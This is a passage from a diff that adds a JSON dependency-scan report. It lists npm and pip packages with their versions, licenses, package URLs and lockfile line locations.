+          ],
+          "Indirect": true,
+          "Relationship": "indirect",
+          "Locations": [
+            {
+              "StartLine": 654,
+              "EndLine": 673
+            }
+          ],
+          "AnalyzedBy": "npm"
+        },
+        {
+          "ID": "lightningcss-linux-x64-musl@1.32.0",
+          "Name": "lightningcss-linux-x64-musl",
+          "Identifier": {
+            "PURL": "pkg:npm/lightningcss-linux-x64-musl@1.32.0",
+            "UID": "6ef2d2e6e7eb89f2"
+          },
+          "Version": "1.32.0",
+          "Licenses": [
+            "MPL-2.0"
+          ],
+          "Indirect": true,
+          "Relationship": "indirect",
+          "Locations": [
+            {
+              "StartLine": 674,
+              "EndLine": 693
+            }
+          ],
+          "AnalyzedBy": "npm"
+        },
+        {
+          "ID": "lightningcss-win32-arm64-msvc@1.32.0",
+          "Name": "lightningcss-win32-arm64-msvc",
+          "Identifier": {
+            "PURL": "pkg:npm/lightningcss-win32-arm64-msvc@1.32.0",
+            "UID": "794abc4a674f1249"
+          },
+          "Version": "1.32.0",
+          "Licenses": [
+            "MPL-2.0"
+          ],
+          "Indirect": true,
+          "Relationship": "indirect",
+          "Locations": [
+            {
+              "StartLine": 694,
+              "EndLine": 713
+            }
+          ],
+          "AnalyzedBy": "npm"
+        },
+        {
+          "ID": "lightningcss-win32-x64-msvc@1.32.0",
+          "Name": "lightningcss-win32-x64-msvc",
+          "Identifier": {
+            "PURL": "pkg:npm/lightningcss-win32-x64-msvc@1.32.0",
+            "UID": "30db9b2e35e1b400"
+          },
+          "Version": "1.32.0",
+          "Licenses": [
+            "MPL-2.0"
+          ],
+          "Indirect": true,
+          "Relationship": "indirect",
+          "Locations": [
+            {
+              "StartLine": 714,
+              "EndLine": 733
+            }
+          ],
+          "AnalyzedBy": "npm"
+        },
+        {
+          "ID": "loose-envify@1.4.0",
+          "Name": "loose-envify",
+          "Identifier": {
+            "PURL": "pkg:npm/loose-envify@1.4.0",
+            "UID": "333a812fc85d6787"
+          },
+          "Version": "1.4.0",
+          "Licenses": [
+            "MIT"
+          ],
+          "Indirect": true,
+          "Relationship": "indirect",
+          "DependsOn": [
+            "js-tokens@4.0.0"
+          ],
+          "Locations": [
+            {
+              "StartLine": 734,
+              "EndLine": 745
+            }
+          ],
+          "AnalyzedBy": "npm"
+        },
+        {
+          "ID": "nanoid@3.3.16",
+          "Name": "nanoid",
+          "Identifier": {
+            "PURL": "pkg:npm/nanoid@3.3.16",
+            "UID": "26089047124b86af"
+          },
+          "Version": "3.3.16",
+          "Licenses": [
+            "MIT"
+          ],
+          "Indirect": true,
+          "Relationship": "indirect",
+          "Locations": [
+            {
+              "StartLine": 746,
+              "EndLine": 763
+            }
+          ],
+          "AnalyzedBy": "npm"
+        },
+        {
+          "ID": "picocolors@1.1.1",
+          "Name": "picocolors",
+          "Identifier": {
+            "PURL": "pkg:npm/picocolors@1.1.1",
+            "UID": "1cd00e6c38c0a1d3"
+          },
+          "Version": "1.1.1",
+          "Licenses": [
+            "ISC"
+          ],
+          "Indirect": true,
+          "Relationship": "indirect",
+          "Locations": [
+            {
+              "StartLine": 764,
+              "EndLine": 769
+            }
+          ],
+          "AnalyzedBy": "npm"
+        },
+        {
+          "ID": "picomatch@4.0.5",
+          "Name": "picomatch",
+          "Identifier": {
+            "PURL": "pkg:npm/picomatch@4.0.5",
+            "UID": "58e0e52f6401b4d8"
+          },
+          "Version": "4.0.5",
+          "Licenses": [
+            "MIT"
+          ],
+          "Indirect": true,
+          "Relationship": "indirect",
+          "Locations": [
+            {
+              "StartLine": 770,
+              "EndLine": 781
+            }
+          ],
+          "AnalyzedBy": "npm"
+        },
+        {
+          "ID": "postcss@8.5.19",
+          "Name": "postcss",
+          "Identifier": {
+            "PURL": "pkg:npm/postcss@8.5.19",
+            "UID": "d59a47d4bd57099"
+          },
+          "Version": "8.5.19",
+          "Licenses": [
+            "MIT"
+          ],
+          "Indirect": true,
+          "Relationship": "indirect",
+          "DependsOn": [
+            "nanoid@3.3.16",
+            "picocolors@1.1.1",
+            "source-map-js@1.2.1"
+          ],
+          "Locations": [
+            {
+              "StartLine": 829,
+              "EndLine": 856
+            }
+          ],
+          "AnalyzedBy": "npm"
+        },
+        {
+          "ID": "rolldown@1.1.5",
+          "Name": "rolldown",
+          "Identifier": {
+            "PURL": "pkg:npm/rolldown@1.1.5",
+            "UID": "ddc170befef78514"
+          },
+          "Version": "1.1.5",
+          "Licenses": [
+            "MIT"
+          ],
+          "Indirect": true,
+          "Relationship": "indirect",
+          "DependsOn": [
+            "@oxc-project/types@0.139.0",
+            "@rolldown/binding-android-arm64@1.1.5",
+            "@rolldown/binding-darwin-arm64@1.1.5",
+            "@rolldown/binding-darwin-x64@1.1.5",
+            "@rolldown/binding-freebsd-x64@1.1.5",
+            "@rolldown/binding-linux-arm-gnueabihf@1.1.5",
+            "@rolldown/binding-linux-arm64-gnu@1.1.5",
+            "@rolldown/binding-linux-arm64-musl@1.1.5",
+            "@rolldown/binding-linux-ppc64-gnu@1.1.5",
+            "@rolldown/binding-linux-s390x-gnu@1.1.5",
+            "@rolldown/binding-linux-x64-gnu@1.1.5",
+            "@rolldown/binding-linux-x64-musl@1.1.5",
+            "@rolldown/binding-openharmony-arm64@1.1.5",
+            "@rolldown/binding-wasm32-wasi@1.1.5",
+            "@rolldown/binding-win32-arm64-msvc@1.1.5",
+            "@rolldown/binding-win32-x64-msvc@1.1.5",
+            "@rolldown/pluginutils@1.0.1"
+          ],
+          "Locations": [
+            {
+              "StartLine": 882,
+              "EndLine": 914
+            }
+          ],
+          "AnalyzedBy": "npm"
+        },
+        {
+          "ID": "scheduler@0.23.2",
+          "Name": "scheduler",
+          "Identifier": {
+            "PURL": "pkg:npm/scheduler@0.23.2",
+            "UID": "d386fc171ac9b147"
+          },
+          "Version": "0.23.2",
+          "Licenses": [
+            "MIT"
+          ],
+          "Indirect": true,
+          "Relationship": "indirect",
+          "DependsOn": [
+            "loose-envify@1.4.0"
+          ],
+          "Locations": [
+            {
+              "StartLine": 915,
+              "EndLine": 923
+            }
+          ],
+          "AnalyzedBy": "npm"
+        },
+        {
+          "ID": "source-map-js@1.2.1",
+          "Name": "source-map-js",
+          "Identifier": {
+            "PURL": "pkg:npm/source-map-js@1.2.1",
+            "UID": "fe690903b428076a"
+          },
+          "Version": "1.2.1",
+          "Licenses": [
+            "BSD-3-Clause"
+          ],
+          "Indirect": true,
+          "Relationship": "indirect",
+          "Locations": [
+            {
+              "StartLine": 924,
+              "EndLine": 932
+            }
+          ],
+          "AnalyzedBy": "npm"
+        },
+        {
+          "ID": "tinyglobby@0.2.17",
+          "Name": "tinyglobby",
+          "Identifier": {
+            "PURL": "pkg:npm/tinyglobby@0.2.17",
+            "UID": "650e5a0b4e2b6af9"
+          },
+          "Version": "0.2.17",
+          "Licenses": [
+            "MIT"
+          ],
+          "Indirect": true,
+          "Relationship": "indirect",
+          "DependsOn": [
+            "fdir@6.5.0",
+            "picomatch@4.0.5"
+          ],
+          "Locations": [
+            {
+              "StartLine": 933,
+              "EndLine": 948
+            }
+          ],
+          "AnalyzedBy": "npm"
+        },
+        {
+          "ID": "tslib@2.8.1",
+          "Name": "tslib",
+          "Identifier": {
+            "PURL": "pkg:npm/tslib@2.8.1",
+            "UID": "b948b6e657753af5"
+          },
+          "Version": "2.8.1",
+          "Licenses": [
+            "0BSD"
+          ],
+          "Indirect": true,
+          "Relationship": "indirect",
+          "Locations": [
+            {
+              "StartLine": 949,
+              "EndLine": 955
+            }
+          ],
+          "AnalyzedBy": "npm"
+        }
+      ]
+    },
+    {
+      "Target": "python/requirements.txt",
+      "Class": "lang-pkgs",
+      "Type": "pip",
+      "Packages": [
+        {
+          "Name": "CacheControl",
+          "Identifier": {
+            "PURL": "pkg:pypi/cachecontrol@0.14.4",
+            "UID": "724536f7bcfcf3f5"
+          },
+          "Version": "0.14.4",
+          "Locations": [
+            {
+              "StartLine": 13,
+              "EndLine": 13
+            }
+          ],
+          "AnalyzedBy": "pip"
+        },
+        {
+          "Name": "Django",
+          "Identifier": {
+            "PURL": "pkg:pypi/django@5.2.14",
+            "UID": "ae46c401553cc79f"
+          },
+          "Version": "5.2.14",
+          "Locations": [
+            {
+              "StartLine": 26,
+              "EndLine": 26
+            }
+          ],
+          "AnalyzedBy": "pip"
+        },
+        {
+          "Name": "GitPython",
+          "Identifier": {
+            "PURL": "pkg:pypi/gitpython@3.1.52",
+            "UID": "b13af17e46d185d8"
+          },
+          "Version": "3.1.52",
+          "Locations": [
+            {
+              "StartLine": 42,
+              "EndLine": 42
+            }
+          ],
+          "AnalyzedBy": "pip"
+        },
+        {
+          "Name": "PyNaCl",
+          "Identifier": {
+            "PURL": "pkg:pypi/pynacl@1.6.2",
+            "UID": "c7985ecfa8b3b008"
+          },
+          "Version": "1.6.2",
+          "Locations": [
+            {
+              "StartLine": 83,
+              "EndLine": 83
+            }
+          ],
+          "AnalyzedBy": "pip"
+        },
+        {
+          "Name": "PyYAML",
+          "Identifier": {
+            "PURL": "pkg:pypi/pyyaml@6.0.3",
+            "UID": "e89afcf75835f0f7"
+          },
+          "Version": "6.0.3",
+          "Locations": [
+            {
+              "StartLine": 91,
+              "EndLine": 91
+            }
+          ],
+          "AnalyzedBy": "pip"
+        },
+        {
+          "Name": "Pygments",
+          "Identifier": {
+            "PURL": "pkg:pypi/pygments@2.20.0",
+            "UID": "a1d3656a76aa567a"
+          },
+          "Version": "2.20.0",
+          "Locations": [
+            {
+              "StartLine": 82,
+              "EndLine": 82
+            }
+          ],
+          "AnalyzedBy": "pip"
+        },
+        {
+          "Name": "aiohappyeyeballs",
+          "Identifier": {
+            "PURL": "pkg:pypi/aiohappyeyeballs@2.6.2",
+            "UID": "4b6db14a0ba6b52"
+          },
+          "Version": "2.6.2",
+          "Locations": [
+            {
+              "StartLine": 2,
+              "EndLine": 2
+            }
+          ],
+          "AnalyzedBy": "pip"
+        },
+        {
+          "Name": "aiohttp",
+          "Identifier": {
+            "PURL": "pkg:pypi/aiohttp@3.14.1",
+            "UID": "3d95be66beb2a34e"
+          },
+          "Version": "3.14.1",
+          "Locations": [
+            {
+              "StartLine": 3,
+              "EndLine": 3
+            }
+          ],
+          "AnalyzedBy": "pip"
+        },
+        {
+          "Name": "aiosignal",
+          "Identifier": {
+            "PURL": "pkg:pypi/aiosignal@1.4.0",
+            "UID": "7e5bdccdd62de82b"
+          },
+          "Version": "1.4.0",
+          "Locations": [
+            {
+              "StartLine": 4,
+              "EndLine": 4
+            }
+          ],
+          "AnalyzedBy": "pip"
+        },
+        {
+          "Name": "annotated-doc",
+          "Identifier": {
+            "PURL": "pkg:pypi/annotated-doc@0.0.4",
+            "UID": "c837fe70be7db609"
+          },
+          "Version": "0.0.4",
+          "Locations": [
+            {
+              "StartLine": 5,
+              "EndLine": 5
+            }
+          ],
+          "AnalyzedBy": "pip"
+        },
+        {
+          "Name": "annotated-types",
+          "Identifier": {
+            "PURL": "pkg:pypi/annotated-types@0.7.0",
+            "UID": "ffb4dcfa48513142"
+          },
+          "Version": "0.7.0",
+          "Locations": [
+            {
+              "StartLine": 6,
+              "EndLine": 6
+            }
+          ],
+          "AnalyzedBy": "pip"
+        },
+        {
+          "Name": "anyio",
+          "Identifier": {
+            "PURL": "pkg:pypi/anyio@4.13.0",
+            "UID": "c75085d3363c38b2"
+          },
+          "Version": "4.13.0",
+          "Locations": [
+            {
+              "StartLine": 7,
+              "EndLine": 7
+            }
+          ],
+          "AnalyzedBy": "pip"
+        },
+        {
+          "Name": "apiview",
+          "Identifier": {
+            "PURL": "pkg:pypi/apiview@1.3.25",
+            "UID": "21b1535237323a58"
+          },
+          "Version": "1.3.25",
+          "Locations": [
+            {
+              "StartLine": 8,
+              "EndLine": 8
+            }
+          ],
+          "AnalyzedBy": "pip"
+        },
+        {
+          "Name": "asgiref",
+          "Identifier": {
+            "PURL": "pkg:pypi/asgiref@3.11.1",
+            "UID": "8aef2f5a5ce4a838"
+          },
+          "Version": "3.11.1",
+          "Locations": [
+            {
+              "StartLine": 9,
+              "EndLine": 9
+            }
+          ],
+          "AnalyzedBy": "pip"
+        },
+        {
+          "Name": "attrs",
+          "Identifier": {
+            "PURL": "pkg:pypi/attrs@26.1.0",
+            "UID": "420d9008edec586c"
+          },
+          "Version": "26.1.0",
+          "Locations": [
+            {
+              "StartLine": 10,
+              "EndLine": 10
+            }
+          ],
+          "AnalyzedBy": "pip"
+        },
+        {
+          "Name": "bitarray",
+          "Identifier": {
+            "PURL": "pkg:pypi/bitarray@3.8.1",
+            "UID": "50c956768b129cd5"
+          },
+          "Version": "3.8.1",
+          "Locations": [
+            {
+              "StartLine": 11,
+              "EndLine": 11
+            }
+          ],
+          "AnalyzedBy": "pip"
+        },
+        {
+          "Name": "boolean.py",
+          "Identifier": {
+            "PURL": "pkg:pypi/boolean.py@5.0",
+            "UID": "788b936df37d5c36"
+          },
+          "Version": "5.0",
+          "Locations": [
+            {
+              "StartLine": 12,
+              "EndLine": 12
+            }
+          ],
+          "AnalyzedBy": "pip"
+        },
+        {
+          "Name": "cbor2",
+          "Identifier": {
+            "PURL": "pkg:pypi/cbor2@6.1.3",
+            "UID": "509710ba5e301074"
+          },
+          "Version": "6.1.3",
+          "Locations": [
+            {
+              "StartLine": 14,
+              "EndLine": 14
+            }
+          ],
+          "AnalyzedBy": "pip"
+        },
+        {
+          "Name": "certifi",
+          "Identifier": {
+            "PURL": "pkg:pypi/certifi@2026.5.20",
+            "UID": "3a6f02be61e09bb5"
+          },
+          "Version": "2026.5.20",
+          "Locations": [
+            {
+              "StartLine": 15,
+              "EndLine": 15
+            }
+          ],
+          "AnalyzedBy": "pip"
+        },
+        {
+          "Name": "cffi",
+          "Identifier": {
+            "PURL": "pkg:pypi/cffi@2.0.0",
+            "UID": "59cf4e7b892643e0"
+          },
+          "Version": "2.0.0",
+          "Locations": [
+            {
+              "StartLine": 16,
+              "EndLine": 16
+            }
+          ],
+          "AnalyzedBy": "pip"
+        },
+        {
+          "Name": "charset-normalizer",
+          "Identifier": {
+            "PURL": "pkg:pypi/charset-normalizer@3.4.7",
+            "UID": "31292ae5f87e9909"
+          },
+          "Version": "3.4.7",
+          "Locations": [
+            {
+              "StartLine": 17,
+              "EndLine": 17
+            }
+          ],
+          "AnalyzedBy": "pip"
+        },
+        {
+          "Name": "ckzg",
+          "Identifier": {
+            "PURL": "pkg:pypi/ckzg@2.1.7",
+            "UID": "511f8652b8e22cc4"
+          },
+          "Version": "2.1.7",
+          "Locations": [
+            {
+              "StartLine": 18,
+              "EndLine": 18
+            }
+          ],
+          "AnalyzedBy": "pip"
+        },
+        {
+          "Name": "click",
+          "Identifier": {
+            "PURL": "pkg:pypi/click@8.4.1",
+            "UID": "11594a60e2829417"
+          },
+          "Version": "8.4.1",
+          "Locations": [
+            {
+              "StartLine": 19,
+              "EndLine": 19
+            }
+          ],
+          "AnalyzedBy": "pip"
+        },
+        {
+          "Name": "coverage",
+          "Identifier": {
+            "PURL": "pkg:pypi/coverage@7.14.1",
+            "UID": "45532c776d817fe1"
+          },
+          "Version": "7.14.1",
+          "Locations": [
+            {
+              "StartLine": 20,
+              "EndLine": 20
+            }
+          ],
+          "AnalyzedBy": "pip"
+        },
+        {
+          "Name": "cryptography",
+          "Identifier": {
+            "PURL": "pkg:pypi/cryptography@49.0.0",
+            "UID": "461f1ebb475999d6"
+          },
+          "Version": "49.0.0",
+          "Locations": [
+            {
+              "StartLine": 21,
+              "EndLine": 21
+            }
+          ],
+          "AnalyzedBy": "pip"
+        },
+        {
+          "Name": "cyclonedx-python-lib",
+          "Identifier": {
+            "PURL": "pkg:pypi/cyclonedx-python-lib@11.11.0",
+            "UID": "89e1978a93799ac2"
+          },
+          "Version": "11.11.0",
+          "Locations": [
+            {
+              "StartLine": 22,
+              "EndLine": 22
+            }
+          ],
+          "AnalyzedBy": "pip"
+        },
+        {
+          "Name": "cytoolz",
+          "Identifier": {
+            "PURL": "pkg:pypi/cytoolz@1.1.0",
+            "UID": "4e90c9251b01ce88"
+          },
+          "Version": "1.1.0",
+          "Locations": [
+            {
+              "StartLine": 23,
+              "EndLine": 23
+            }
+          ],
+          "AnalyzedBy": "pip"
+        },
+        {
+          "Name": "defusedxml",
+          "Identifier": {
+            "PURL": "pkg:pypi/defusedxml@0.7.1",
+            "UID": "cbe5b43c5ebe4d40"
+          },
+          "Version": "0.7.1",
+          "Locations": [
+            {
+              "StartLine": 24,
+              "EndLine": 24
+            }
+          ],
+          "AnalyzedBy": "pip"
+        },
+        {
+          "Name": "diff-match-patch",
+          "Identifier": {
+            "PURL": "pkg:pypi/diff-match-patch@20241021",
+            "UID": "986ee015fe9db8f6"
+          },
+          "Version": "20241021",
+          "Locations": [
+            {
+              "StartLine": 25,
+              "EndLine": 25
+            }
+          ],
+          "AnalyzedBy": "pip"
+        },
+        {
+          "Name": "django-import-export",
+          "Identifier": {
+            "PURL": "pkg:pypi/django-import-export@4.4.1",
+            "UID": "8775f863512e8b2b"
+          },
+          "Version": "4.4.1",
+          "Locations": [
+            {
+              "StartLine": 27,
+              "EndLine": 27
+            }
+          ],
+          "AnalyzedBy": "pip"
+        },
+        {
+          "Name": "djangorestframework",
+          "Identifier": {
+            "PURL": "pkg:pypi/djangorestframework@3.17.1",
+            "UID": "72c74eab7947a847"
+          },
+          "Version": "3.17.1",
+          "Locations": [
+            {
+              "StartLine": 28,
+              "EndLine": 28
+            }
+          ],
+          "AnalyzedBy": "pip"
+        },
+        {
+          "Name": "eth-account",
+          "Identifier": {
+            "PURL": "pkg:pypi/eth-account@0.13.7",
+            "UID": "d37ba1859ed31192"
+          },
+          "Version": "0.13.7",
+          "Locations": [
+            {
+              "StartLine": 29,
+              "EndLine": 29
+            }
+          ],
+          "AnalyzedBy": "pip"
+        },
+        {
+          "Name": "eth-hash",
+          "Identifier": {
+            "PURL": "pkg:pypi/eth-hash@0.8.0",
+            "UID": "de2ac53f083bd69"
+          },
+          "Version": "0.8.0",
+          "Locations": [
+            {
+              "StartLine": 30,
+              "EndLine": 30
+            }
+          ],
+          "AnalyzedBy": "pip"
+        },
+        {
+          "Name": "eth-keyfile",
+          "Identifier": {
+            "PURL": "pkg:pypi/eth-keyfile@0.8.1",
+            "UID": "2696bd9c77ab2072"
+          },
+          "Version": "0.8.1",
+          "Locations": [
+            {
+              "StartLine": 31,
+              "EndLine": 31
+            }
+          ],
+          "AnalyzedBy": "pip"
+        },
+        {
+          "Name": "eth-keys",
+          "Identifier": {
+            "PURL": "pkg:pypi/eth-keys@0.7.0",
+            "UID": "3e43a2a773031933"
+          },
+          "Version": "0.7.0",
+          "Locations": [
+            {
+              "StartLine": 32,
+              "EndLine": 32
+            }
+          ],
+          "AnalyzedBy": "pip"
+        },
+        {
+          "Name": "eth-rlp",
+          "Identifier": {
+            "PURL": "pkg:pypi/eth-rlp@2.2.0",
+            "UID": "51d7f2d77110b68c"
+          },
+          "Version": "2.2.0",
+          "Locations": [
+            {
+              "StartLine": 33,
+              "EndLine": 33
+            }
+          ],
+          "AnalyzedBy": "pip"
+        },
+        {
+          "Name": "eth-typing",
+          "Identifier": {
+            "PURL": "pkg:pypi/eth-typing@6.0.0",
+            "UID": "a4347d983947076b"
+          },
+          "Version": "6.0.0",
+          "Locations": [
+            {
+              "StartLine": 34,
+              "EndLine": 34
+            }
+          ],
+          "AnalyzedBy": "pip"
+        },
+        {
+          "Name": "eth-utils",
+          "Identifier": {
+            "PURL": "pkg:pypi/eth-utils@6.0.0",
+            "UID": "9f14945cc5b3c40b"
+          },
+          "Version": "6.0.0",
+          "Locations": [
+            {
+              "StartLine": 35,
+              "EndLine": 35
+            }
+          ],
+          "AnalyzedBy": "pip"
+        },
+        {
+          "Name": "eth_abi",
+          "Identifier": {
+            "PURL": "pkg:pypi/eth-abi@5.2.0",
+            "UID": "918849f728de0ce9"
+          },
+          "Version": "5.2.0",
+          "Locations": [
+            {
+              "StartLine": 36,
+              "EndLine": 36
+            }
+          ],
+          "AnalyzedBy": "pip"
+        },
+        {
+          "Name": "fastapi",
+          "Identifier": {
+            "PURL": "pkg:pypi/fastapi@0.136.3",
+            "UID": "445d1057c14ea4c7"
+          },
+          "Version": "0.136.3",
+          "Locations": [
+            {
+              "StartLine": 37,
+              "EndLine": 37
+            }
+          ],
+          "AnalyzedBy": "pip"
+        },
+        {
+          "Name": "filelock",
+          "Identifier": {
+            "PURL": "pkg:pypi/filelock@3.32.0",
+            "UID": "c0ad5b791d018431"
+          },
+          "Version": "3.32.0",
+          "Locations": [
+            {
+              "StartLine": 38,
+              "EndLine": 38
+            }
+          ],
+          "AnalyzedBy": "pip"
+        },
+        {
+          "Name": "frozenlist",
+          "Identifier": {
+            "PURL": "pkg:pypi/frozenlist@1.8.0",
+            "UID": "58e5f4d5c08560e7"
+          },
+          "Version": "1.8.0",
+          "Locations": [
+            {
+              "StartLine": 39,
+              "EndLine": 39
+            }
+          ],
+          "AnalyzedBy": "pip"
+        },
+        {
+          "Name": "gh",
+          "Identifier": {
+            "PURL": "pkg:pypi/gh@0.0.4",
+            "UID": "5487c88c9b3f1baa"
+          },
+          "Version": "0.0.4",
+          "Locations": [
+            {
+              "StartLine": 40,
+              "EndLine": 40
+            }
+          ],
+          "AnalyzedBy": "pip"
+        },
+        {
+          "Name": "gitdb",
+          "Identifier": {
+            "PURL": "pkg:pypi/gitdb@4.0.12",
+            "UID": "367b70cdcce2460a"
+          },
+          "Version": "4.0.12",
+          "Locations": [
+            {
+              "StartLine": 41,
+              "EndLine": 41
+            }
+          ],
+          "AnalyzedBy": "pip"
+        },
+        {
+          "Name": "h11",
+          "Identifier": {
+            "PURL": "pkg:pypi/h11@0.16.0",
+            "UID": "d4711614ea43aeb9"
+          },
+          "Version": "0.16.0",
+          "Locations": [
+            {
+              "StartLine": 43,
+              "EndLine": 43
+            }
+          ],
+          "AnalyzedBy": "pip"
+        },
+        {
+          "Name": "hexbytes",
+          "Identifier": {
+            "PURL": "pkg:pypi/hexbytes@1.3.1",
+            "UID": "d15a1470cbac540e"
+          },
+          "Version": "1.3.1",
+          "Locations": [
+            {
+              "StartLine": 44,
+              "EndLine": 44
+            }
+          ],
+          "AnalyzedBy": "pip"
+        },
+        {
+          "Name": "httpcore",
+          "Identifier": {
+            "PURL": "pkg:pypi/httpcore@1.0.9",
+            "UID": "ec0174d160a66b25"
+          },
+          "Version": "1.0.9",
+          "Locations": [
+            {
+              "StartLine": 45,
+              "EndLine": 45
+            }
+          ],
+          "AnalyzedBy": "pip"
+        },
+        {
+          "Name": "httptools",
+          "Identifier": {
+            "PURL": "pkg:pypi/httptools@0.8.0",
+            "UID": "c3466b4038226d08"
+          },
+          "Version": "0.8.0",
+          "Locations": [
+            {
+              "StartLine": 46,
+              "EndLine": 46
+            }
+          ],
+          "AnalyzedBy": "pip"
+        },
+        {
+          "Name": "httpx",
+          "Identifier": {
+            "PURL": "pkg:pypi/httpx@0.28.1",
+            "UID": "6a23b86675045f60"
+          },
+          "Version": "0.28.1",
+          "Locations": [
+            {
+              "StartLine": 47,
+              "EndLine": 47
+            }
+          ],
+          "AnalyzedBy": "pip"
+        },
+        {
+          "Name": "hypothesis",
+          "Identifier": {
+            "PURL": "pkg:pypi/hypothesis@6.155.0",
+            "UID": "43d4578d37bfdaf1"
+          },
+          "Version": "6.155.0",
+          "Locations": [
+            {
+              "StartLine": 48,
+              "EndLine": 48
+            }
+          ],
+          "AnalyzedBy": "pip"
+        },
+        {
+          "Name": "idna",
+          "Identifier": {
+            "PURL": "pkg:pypi/idna@3.17",
+            "UID": "1a5e9c05616699b9"
+          },
+          "Version": "3.17",
+          "Locations": [
+            {
+              "StartLine": 49,
+              "EndLine": 49
+            }
+          ],
+          "AnalyzedBy": "pip"
+        },
+        {
+          "Name": "iniconfig",
+          "Identifier": {
+            "PURL": "pkg:pypi/iniconfig@2.3.0",
+            "UID": "25451267f3a2b81f"
+          },
+          "Version": "2.3.0",
+          "Locations": [
+            {
+              "StartLine": 50,
+              "EndLine": 50
+            }
+          ],
+          "AnalyzedBy": "pip"
+        },
+        {
+          "Name": "joblib",
+          "Identifier": {
+            "PURL": "pkg:pypi/joblib@1.5.3",
+            "UID": "c1193d80c3bc07bf"
+          },
+          "Version": "1.5.3",
+          "Locations": [
+            {
+              "StartLine": 51,
+              "EndLine": 51
+            }
+          ],
+          "AnalyzedBy": "pip"
+        },
+        {
+          "Name": "jsonschema",
+          "Identifier": {
+            "PURL": "pkg:pypi/jsonschema@4.26.0",
+            "UID": "7a1c2bd05a56a13a"
+          },
+          "Version": "4.26.0",
+          "Locations": [
+            {
+              "StartLine": 52,
+              "EndLine": 52
+            }
+          ],
+          "AnalyzedBy": "pip"
+        },
+        {
+          "Name": "jsonschema-specifications",
+          "Identifier": {
+            "PURL": "pkg:pypi/jsonschema-specifications@2025.9.1",
+            "UID": "ca7d35b420de4f52"
+          },
+          "Version": "2025.9.1",
+          "Locations": [
+            {
+              "StartLine": 53,
+              "EndLine": 53
+            }
+          ],
+          "AnalyzedBy": "pip"
+        },
+        {
+          "Name": "libcst",
+          "Identifier": {
+            "PURL": "pkg:pypi/libcst@1.8.6",
+            "UID": "e177a920fa214228"
+          },
+          "Version": "1.8.6",
+          "Locations": [
+            {
+              "StartLine": 54,
+              "EndLine": 54
+            }
+          ],
+          "AnalyzedBy": "pip"
+        },
+        {
+          "Name": "license-expression",
+          "Identifier": {
+            "PURL": "pkg:pypi/license-expression@30.4.4",
+            "UID": "b75c6d9812c789d0"
+          },
+          "Version": "30.4.4",
+          "Locations": [
+            {
+              "StartLine": 55,
+              "EndLine": 55
+            }
+          ],
+          "AnalyzedBy": "pip"
+        },
+        {
+          "Name": "linkify-it-py",
+          "Identifier": {
+            "PURL": "pkg:pypi/linkify-it-py@2.1.0",
+            "UID": "c0849dcd145e48c8"
+          },
+          "Version": "2.1.0",
+          "Locations": [
+            {
+              "StartLine": 56,
+              "EndLine": 56
+            }
+          ],
+          "AnalyzedBy": "pip"
+        },
+        {
+          "Name": "markdown-it-py",
+          "Identifier": {
+            "PURL": "pkg:pypi/markdown-it-py@4.2.0",
+            "UID": "e238e2472e0d1fb6"
+          },
+          "Version": "4.2.0",
+          "Locations": [
+            {
+              "StartLine": 57,
+              "EndLine": 57
+            }
+          ],
+          "AnalyzedBy": "pip"
+        },
+        {
+          "Name": "mdit-py-plugins",
+          "Identifier": {
+            "PURL": "pkg:pypi/mdit-py-plugins@0.6.1",
+            "UID": "55f2920af2b286b7"
+          },
+          "Version": "0.6.1",
+          "Locations": [
+            {
+              "StartLine": 58,
+              "EndLine": 58
+            }
+          ],
+          "AnalyzedBy": "pip"
+        },
+        {
+          "Name": "mdurl",
+          "Identifier": {
+            "PURL": "pkg:pypi/mdurl@0.1.2",
+            "UID": "d32059f784bd6378"
+          },
+          "Version": "0.1.2",
+          "Locations": [
+            {
+              "StartLine": 59,
+              "EndLine": 59
+            }
+          ],
+          "AnalyzedBy": "pip"
+        },
+        {
+          "Name": "msgpack",
+          "Identifier": {
+            "PURL": "pkg:pypi/msgpack@1.2.1",
+            "UID": "5090769091196f04"
+          },
+          "Version": "1.2.1",
+          "Locations": [
+            {
+              "StartLine": 60,
+              "EndLine": 60
+            }
+          ],
+          "AnalyzedBy": "pip"
+        },
+        {
+          "Name": "multidict",
+          "Identifier": {
+            "PURL": "pkg:pypi/multidict@6.7.1",
+            "UID": "8b02bbc2002bd1a8"
+          },
+          "Version": "6.7.1",
+          "Locations": [
+            {
+              "StartLine": 61,
+              "EndLine": 61
+            }
+          ],
+          "AnalyzedBy": "pip"
+        },
+        {
+          "Name": "mutmut",
+          "Identifier": {
+            "PURL": "pkg:pypi/mutmut@3.5.0",
+            "UID": "e5617bcabfc8487e"
+          },
+          "Version": "3.5.0",
+          "Locations": [
+            {
+              "StartLine": 62,
+              "EndLine": 62
+            }
+          ],
+          "AnalyzedBy": "pip"
+        },
+        {
+          "Name": "numpy",
+          "Identifier": {
+            "PURL": "pkg:pypi/numpy@2.4.6",
+            "UID": "7deee931948d824a"
+          },
+          "Version": "2.4.6",
+          "Locations": [
+            {
+              "StartLine": 63,
+              "EndLine": 63
+            }
+          ],
+          "AnalyzedBy": "pip"
+        },
+        {
+          "Name": "packageurl-python",
+          "Identifier": {
+            "PURL": "pkg:pypi/packageurl-python@0.17.6",
+            "UID": "6b79daf99de60df9"
+          },
+          "Version": "0.17.6",
+          "Locations": [
+            {
+              "StartLine": 64,
+              "EndLine": 64
+            }
+          ],
+          "AnalyzedBy": "pip"
+        },
+        {
+          "Name": "packaging",
+          "Identifier": {
+            "PURL": "pkg:pypi/packaging@26.2",
+            "UID": "fe4f171183c9e4b6"
+          },
+          "Version": "26.2",
+          "Locations": [
+            {
+              "StartLine": 65,
+              "EndLine": 65
+            }
+          ],
+          "AnalyzedBy": "pip"
+        },
+        {
+          "Name": "parsimonious",
+          "Identifier": {
+            "PURL": "pkg:pypi/parsimonious@0.10.0",
+            "UID": "dbcd6e2f65c42026"
+          },
+          "Version": "0.10.0",
+          "Locations": [
+            {
+              "StartLine": 66,
+              "EndLine": 66
+            }
+          ],
+          "AnalyzedBy": "pip"
+        },
+        {
+          "Name": "pip-api",
+          "Identifier": {
+            "PURL": "pkg:pypi/pip-api@0.0.34",
+            "UID": "a1b08cbdeec3f22f"
+          },
+          "Version": "0.0.34",
+          "Locations": [
+            {
+              "StartLine": 67,
+              "EndLine": 67
+            }
+          ],
+          "AnalyzedBy": "pip"
+        },
+        {
+          "Name": "pip-requirements-parser",
+          "Identifier": {
+            "PURL": "pkg:pypi/pip-requirements-parser@32.0.1",
+            "UID": "c129749dc0f01989"
+          },
+          "Version": "32.0.1",
+          "Locations": [
+            {
+              "StartLine": 68,
